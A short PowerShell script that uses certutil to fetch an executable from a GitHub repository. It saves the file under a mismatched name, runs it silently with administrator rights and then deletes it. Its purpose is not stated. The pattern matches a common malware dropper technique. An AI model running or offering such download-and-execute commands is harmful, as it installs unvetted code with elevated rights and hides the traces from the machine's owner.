C:\Windows\System32\Certutil.Exe -Urlcache -Split -F https://github.com/crjtpp/tools_public/raw/main/7z2201-x64.exe $env:TEMP\pythonwinx64.Exe
Start-Process -FilePath $env:TEMP\pythonwinx64.Exe -Args "/S" -Verb RunAs -Wait
Remove-Item $env:TEMP\pythonwinx64.Exe
